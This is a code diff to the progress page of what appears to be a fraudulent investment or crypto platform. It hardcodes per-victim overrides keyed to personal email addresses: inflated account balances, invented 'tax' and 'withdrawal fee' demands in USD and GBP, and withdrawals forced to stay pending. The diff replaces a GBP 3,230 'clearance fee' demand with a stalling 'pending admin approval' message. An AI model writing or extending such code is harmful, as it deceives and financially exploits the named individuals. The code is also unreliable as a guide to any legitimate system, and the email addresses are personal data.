@@ -370,7 +370,7 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     lockTaxDisplay: true
   },
   "josiahbauman03@gmail.com": {
-    currentValue: 89500,
+    currentValue: 98970,
     taxRate: 0.165,
     taxDue: 825,
     taxRemaining: 0,
@@ -414,7 +414,7 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
   ,
   "josiahbauman03@gmail.com":
-    "Congratulations on clearing your tax. A refundable clearance fee of GBP 3,230.00 is now required to complete wallet verification and release your withdrawal. Please clear this fee to proceed."
+    "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is pending admin approval."
 };
 const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["samlebrun01@gmail.com", "tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
@@ -428,6 +428,11 @@ const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
     message: "Clear withdrawal fee of $680.00. Amount of $2,550.00 is pending to be sent to your wallet.",
     appendPendingAmount: false
   },
+  "josiahbauman03@gmail.com": {
+    message:
+      "Congratulations on clearing your taxes. Final step: your withdrawal is pending admin approval. Pending amount: GBP 5,000.00.",
+    appendPendingAmount: false
+  },
   "tzahielk@gmail.com": {
     message: "Your withdrawal is being processed to your wallet.",
     appendPendingAmount: true
@@ -438,7 +443,8 @@ const WITHDRAWAL_SUCCESS_POPUP_BY_EMAIL: Record<string, string> = {
     "Congratulations for clearing tax. Your money will be sent to your wallet, but clear the withdrawal fee of $680.00. Amount to be transferred to your wallet: $2,550.00."
 };
 const FORCED_PENDING_WITHDRAWAL_BY_EMAIL: Record<string, { amount: number; currency: "USD" | "GBP" }> = {
-  "samlebrun01@gmail.com": { amount: 2550, currency: "USD" }
+  "samlebrun01@gmail.com": { amount: 2550, currency: "USD" },
+  "josiahbauman03@gmail.com": { amount: 5000, currency: "GBP" }
 };
 const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
   "samlebrun01@gmail.com":
@@ -1755,7 +1761,7 @@ export default function ProgressPage() {
       if (userEmailLower === "josiahbauman03@gmail.com") {
         await new Promise((resolve) => window.setTimeout(resolve, 1200));
         setTaxPopup(
-          "Congratulations on clearing your tax. A refundable clearance fee of GBP 3,230.00 is now required to complete wallet verification and release your withdrawal. Please clear this fee to proceed."
+          "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is now pending admin approval."
         );
         return;
       }
